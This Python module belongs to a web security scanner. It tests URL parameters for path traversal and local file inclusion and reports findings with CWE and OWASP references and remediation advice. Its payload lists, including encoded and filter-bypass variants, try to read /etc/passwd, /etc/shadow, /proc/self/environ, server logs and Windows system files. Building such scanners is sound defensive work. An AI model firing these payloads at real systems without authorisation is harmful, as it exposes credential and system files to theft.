"""
Path Traversal / Local File Inclusion (LFI) Detection Module
Tests URL parameters for directory traversal and file read vulnerabilities.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# ── Traversal Payloads ────────────────────────────────────────────────────────
# (payload, expected_signature, target_file_hint)
UNIX_PAYLOADS = [
    ("../../../etc/passwd",                        "root:x:",        "/etc/passwd"),
    ("../../../../etc/passwd",                     "root:x:",        "/etc/passwd"),
    ("../../../../../etc/passwd",                  "root:x:",        "/etc/passwd"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",               "root:x:",        "/etc/passwd (URL encoded)"),
    ("..%252F..%252F..%252Fetc%252Fpasswd",        "root:x:",        "/etc/passwd (double encoded)"),
    ("/etc/passwd",                                "root:x:",        "/etc/passwd (absolute)"),
    ("....//....//....//etc/passwd",               "root:x:",        "/etc/passwd (filter bypass)"),
    ("..././..././..././etc/passwd",               "root:x:",        "/etc/passwd (filter bypass 2)"),
    ("../../../etc/shadow",                        "root:$",         "/etc/shadow"),
    ("../../../proc/self/environ",                 "PATH=",          "/proc/self/environ"),
    ("../../../var/log/apache2/access.log",        "GET /",          "Apache access log"),
    ("../../../var/log/nginx/access.log",          "HTTP/",          "Nginx access log"),
]

WINDOWS_PAYLOADS = [
    ("..\\..\\..\\windows\\win.ini",              "[extensions]",   "win.ini"),
    ("..%5C..%5C..%5Cwindows%5Cwin.ini",          "[extensions]",   "win.ini (URL encoded)"),
    ("C:\\Windows\\win.ini",                       "[extensions]",   "win.ini (absolute)"),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "127.0.0.1", "hosts file"),
    ("%SYSTEMROOT%\\win.ini",                      "[extensions]",   "win.ini (env var)"),
]

# Suspicious parameter names often used in file inclusion
SUSPICIOUS_PARAMS = {
    "file", "path", "page", "include", "load", "filename", "filepath",
    "template", "view", "doc", "document", "dir", "folder", "resource",
    "src", "source", "data", "config", "conf", "read", "lang", "language",
    "module", "content", "layout", "tpl", "theme", "skin",
}


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_path_traversal(url: str, timeout: int = 8, quick_mode: bool = False) -> list:
    findings = []
    parsed = urlparse(url)
    all_params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not all_params:
        return findings

    # Prioritise suspicious parameter names; in quick_mode only test those
    priority_params = [p for p in all_params if p.lower() in SUSPICIOUS_PARAMS]
    test_params = priority_params if (quick_mode and priority_params) else all_params

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner)"})

    unix_payloads = UNIX_PAYLOADS[:4] if quick_mode else UNIX_PAYLOADS
    win_payloads  = [] if quick_mode else WINDOWS_PAYLOADS
    all_payloads  = unix_payloads + win_payloads
    seen = set()

    for param in test_params:
        if param in seen:
            continue
        for payload, signature, target_hint in all_payloads:
            test_url = _inject_param(url, param, payload)
            try:
                resp = session.get(test_url, timeout=timeout,
                                   allow_redirects=True, verify=False)
                if resp.status_code in (200, 206) and signature.lower() in resp.text.lower():
                    seen.add(param)
                    findings.append({
                        "name": "Path Traversal / Local File Inclusion (LFI)",
                        "type": "Path Traversal",
                        "severity": "High",
                        "cvss_score": 7.5,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        "category": "path_traversal",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": (
                            f"File signature '{signature}' found in response when requesting "
                            f"'{target_hint}' via parameter '{param}'"
                        ),
                        "request_data": test_url,
                        "response_data": resp.text[:500],
                        "cwe_id": "CWE-22",
                        "owasp_category": "A01:2021",
                        "detail": (
                            f"The parameter '{param}' allows reading arbitrary files from the "
                            f"server filesystem. Content matching '{signature}' was retrieved "
                            f"from '{target_hint}', indicating a successful path traversal."
                        ),
                        "remediation": (
                            "Never use user-controlled input to construct file paths. "
                            "Use a whitelist of allowed files/templates. "
                            "Resolve the canonical path and verify it starts with the expected base directory. "
                            "Run the web server with minimal filesystem permissions."
                        ),
                        "references": [
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                            "https://cwe.mitre.org/data/definitions/22.html",
                            "https://portswigger.net/web-security/file-path-traversal",
                        ],
                    })
                    break
            except Exception:
                continue

    return findings
